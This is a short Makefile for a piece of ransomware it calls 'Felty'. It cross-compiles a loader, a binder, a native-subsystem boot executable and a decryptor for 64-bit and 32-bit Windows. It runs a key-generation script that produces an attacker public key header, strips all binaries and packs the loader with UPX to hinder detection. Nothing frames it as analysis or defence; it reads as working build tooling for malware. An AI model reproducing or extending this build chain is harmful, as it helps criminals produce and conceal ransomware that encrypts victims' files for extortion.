# Felty Ransomware Makefile — Dual x64 + Win32
CC64   = x86_64-w64-mingw32-gcc
CC32   = i686-w64-mingw32-gcc
CFLAGS = -Os -s -Wall
LIBS   = -lcrypt32 -ladvapi32 -lgdi32 -luser32 -lnetapi32

all: \
    attacker_pubkey.h \
    x64/felty_loader.exe x64/felty_binder.exe \
    x64/felty_decrypt.exe x64/felty_boot.exe \
    win32/felty_loader.exe win32/felty_binder.exe \
    win32/felty_decrypt.exe win32/felty_boot.exe

x64 win32:
	mkdir -p $@

# ===================== KEY GENERATION =====================
attacker_pubkey.h: felty_keygen.py
	python3 felty_keygen.py

# ===================== x64 BUILDS =====================
x64/felty_loader.exe: felty_loader.c attacker_pubkey.h | x64
	$(CC64) $(CFLAGS) -o $@ felty_loader.c $(LIBS) -mwindows
	strip --strip-all $@
	upx --best $@ 2>/dev/null || true

x64/felty_binder.exe: felty_binder.c | x64
	$(CC64) $(CFLAGS) -o $@ felty_binder.c $(LIBS) -mwindows
	strip --strip-all $@

x64/felty_boot.exe: felty_boot.c | x64
	$(CC64) -Os -s -nostdlib -Wl,--subsystem,native -e NtProcessStartup \
		-o $@ felty_boot.c -lntdll
	strip --strip-all $@

x64/felty_decrypt.exe: felty_decrypt.c | x64
	$(CC64) $(CFLAGS) -municode -o $@ felty_decrypt.c -lcrypt32 -ladvapi32
	strip --strip-all $@

# ===================== Win32 BUILDS =====================
win32/felty_loader.exe: felty_loader.c attacker_pubkey.h | win32
	$(CC32) $(CFLAGS) -o $@ felty_loader.c $(LIBS) -mwindows
	strip --strip-all $@
	upx --best $@ 2>/dev/null || true

win32/felty_binder.exe: felty_binder.c | win32
	$(CC32) $(CFLAGS) -o $@ felty_binder.c $(LIBS) -mwindows
	strip --strip-all $@

win32/felty_boot.exe: felty_boot.c | win32
	$(CC32) -Os -s -nostdlib -Wl,--subsystem,native -e _NtProcessStartup@4 \
		-o $@ felty_boot.c -lntdll
	strip --strip-all $@

win32/felty_decrypt.exe: felty_decrypt.c | win32
	$(CC32) $(CFLAGS) -municode -o $@ felty_decrypt.c -lcrypt32 -ladvapi32
	strip --strip-all $@

clean:
	rm -rf x64 win32 *.exe attacker_pubkey.h *.o
